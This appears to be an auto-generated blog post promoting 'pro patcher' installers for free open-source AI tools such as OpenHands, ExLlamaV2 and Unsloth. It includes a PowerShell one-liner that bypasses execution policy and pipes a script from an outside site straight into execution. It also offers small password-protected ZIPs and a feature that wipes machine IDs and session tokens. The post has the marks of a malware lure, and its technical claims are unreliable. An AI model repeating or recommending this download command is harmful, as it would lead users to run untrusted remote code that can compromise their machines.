---
title: "Windows Portable AI Environments with Embedded Runtimes and Quantization Support"
slug: "windows-portable-ai-environments-with-embedded-runtimes-and-quantization-support"
description: "A set of new pre-configured 64-bit Windows 10/11 distributions has been released, bundling runtime libraries, offline configuration profiles, and installers into single portable packages for AI..."
date: 2026-11-28T12:09:39+05:30
tags: [AI, Windows, LLM, PortableApps, CUDA, Quantization]
categories: ["AI", "Machine Learning", "Developer Tools", "AI Infrastructure", "Windows"]
image: "https://avatars.githubusercontent.com/u/309019269?v=4"
author: "Shoubhik Banerjee"
draft: false
---

# Windows Portable AI Environments with Embedded Runtimes and Quantization Support

A set of new pre-configured 64-bit Windows 10/11 distributions has been released, bundling runtime libraries, offline configuration profiles, and installers into single portable packages for AI development and inference tasks.

## 🧩 How it works
These distributions feature a zero-dependency embedded Python 3.12 runtime and a precompiled Windows x64 portable environment. The stack includes CUDA 12.6, Triton, and SageAttention-2 wheels. 

Key capabilities include:
*   Native FP8, GGUF (Q4_K_M / Q5_K_M / Q8_0), and EXL2 quantized weight loader with VRAM offloading.
*   Local OpenAI-compatible REST API server and WebUI dashboard with batch queue support.
*   Automatic model checkpoint downloader.
*   Bundled C++ Runtime (`vcruntime140.dll`, `vcruntime140_1.dll`).

## ⚙️ Key details
Specific utility features vary by package:
*   **OpenHands**: Includes an automated `telemetry.machineId`, `macMachineId`, and `devDeviceId` UUID regenerator, a SQLite `state.vscdb` and `storage.json` session token cleaner, and a Windows Registry `MachineGuid` backup and clean profile switcher.
*   **General Runtime**: Target runtime is NVIDIA CUDA 12.6 / TensorRT 10.4 & PyTorch 2.6 x64 Runtime (`cublas64_12.dll`).

| Package | Version | Binary | Install Path |
| :--- | :--- | :--- | :--- |
| OpenHands | v2.4.3 | `OpenhandsProPatcher-Installer.exe` | `%APPDATA%\Openhands\User\globalStorage` |
| ExLlamaV2 Windows | v2.5.6 | `Exllamav2Windows-Setup.exe` | `%LOCALAPPDATA%\Programs\Exllamav2Windows` |
| ExLlamaV2 | v2.6.0 | `Exllamav2ProPatcher-Installer.exe` | `%LOCALAPPDATA%\Programs\Exllamav2` |
| Unsloth Windows | v2.3.0 | `UnslothWindowsPro-Installer.exe` | `%LOCALAPPDATA%\Programs\UnslothWindows` |
| Axolotl AI | v2.1.3 | `AxolotlAIProPatcher-Installer.exe` | `%LOCALAPPDATA%\Programs\AxolotlAi` |
| LLaMA-Factory | v2.0.0 | `LlamaFactoryPro-Installer.exe` | `%LOCALAPPDATA%\Programs\LlamaFactory` |

All packages support Windows 10 / Windows 11 (64-bit, 22H2–24H2).

## 🚀 Availability
Users can download portable `.ZIP` archives (2.66 MB, password: `2026`) or use an automated PowerShell command via `Win + R`:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/[package-name] | iex"
```

Installers are launched from their respective install paths, with setup portals available for interactive configuration and mirrors.

#AI #Windows #LLM #PortableApps #CUDA #Quantization

---

*Source: [JisungRoux8050/openhands-pro-patcher-installer](https://github.com/JisungRoux8050/openhands-pro-patcher-installer)*
*Source: [carolynwilson5853/exllamav2-windows-desktop-suite](https://github.com/carolynwilson5853/exllamav2-windows-desktop-suite)*
*Source: [LarsSingh20/exllamav2-pro-patcher-installer](https://github.com/LarsSingh20/exllamav2-pro-patcher-installer)*
*Source: [tiojqwdota/unsloth-windows-pro-patcher-installer](https://github.com/tiojqwdota/unsloth-windows-pro-patcher-installer)*
*Source: [larsson692/axolotl-ai-pro-patcher-installer](https://github.com/larsson692/axolotl-ai-pro-patcher-installer)*
*Source: [Jacquelinea306/llama-factory-pro-patcher-installer](https://github.com/Jacquelinea306/llama-factory-pro-patcher-installer)*
